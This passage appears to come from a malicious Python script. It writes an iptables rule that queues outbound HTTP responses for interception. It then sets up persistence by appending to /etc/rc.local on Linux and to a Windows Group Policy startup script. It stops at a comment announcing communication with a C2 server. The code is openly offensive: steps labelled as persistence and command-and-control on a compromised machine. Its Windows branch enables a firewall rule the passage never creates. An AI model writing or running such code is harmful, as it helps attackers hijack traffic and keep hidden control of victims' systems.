    with open('/etc/iptables/rules.v4', 'a') as f:
        f.write('-A OUTPUT -p tcp --dport 80 -m string --string "HTTP/1.1 200 OK" --algo bm -j NFQUEUE --queue-num 1\n')
    
    # Step 4: Establish persistence
    if os.name == 'posix':  # Linux
        with open('/etc/rc.local', 'a') as f:
            f.write(f'iptables-restore < /etc/iptables/rules.v4\n')
    elif os.name == 'nt':  # Windows
        with open('C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\Startup\\startup.bat', 'a') as f:
            f.write('netsh advfirewall firewall set rule name="Redirect HTTP" new enable=yes\n')
    
    # Step 5: Communicate with C2 server
